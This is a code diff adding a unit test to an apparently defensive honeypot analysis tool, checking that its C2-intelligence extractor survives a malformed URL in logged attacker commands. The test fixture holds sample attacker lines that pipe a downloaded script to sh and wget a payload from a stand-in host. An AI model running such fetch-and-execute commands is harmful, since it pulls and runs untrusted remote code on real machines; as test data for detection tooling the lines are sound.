@@ -68,6 +68,20 @@ class C2Intelligence(unittest.TestCase):
         self.assertTrue(all(x["confidence"] == "candidate" for x in result["candidates"]))
 
 
+    def test_a_malformed_url_in_attacker_text_does_not_break_the_view(self):
+        obj = ha.HoneyAnalysis.__new__(ha.HoneyAnalysis)
+        obj.lock = threading.Lock()
+        obj.db = sqlite3.connect(":memory:")
+        obj.db.execute("CREATE TABLE sessions (id TEXT, ip TEXT, start REAL, commands TEXT)")
+        obj.db.execute("CREATE TABLE samples (sha256 TEXT, first_seen REAL, last_seen REAL, analysis TEXT)")
+        now = time.time()
+        obj.db.execute("INSERT INTO sessions VALUES (?,?,?,?)", ("s-1", "198.51.100.9", now,
+                       json.dumps(["curl http://[abc/x.sh | sh", "wget http://malicious.com/payload.sh"])))
+        obj.db.commit()
+        values = {(x["kind"], x["value"]) for x in obj.c2_intelligence(24)["candidates"]}
+        self.assertIn(("url", "http://malicious.com/payload.sh"), values)
+
+
 class FileType(unittest.TestCase):
     def test_elf_arm_static(self):
         r = ha.identify(elf(40, 32, True, False))
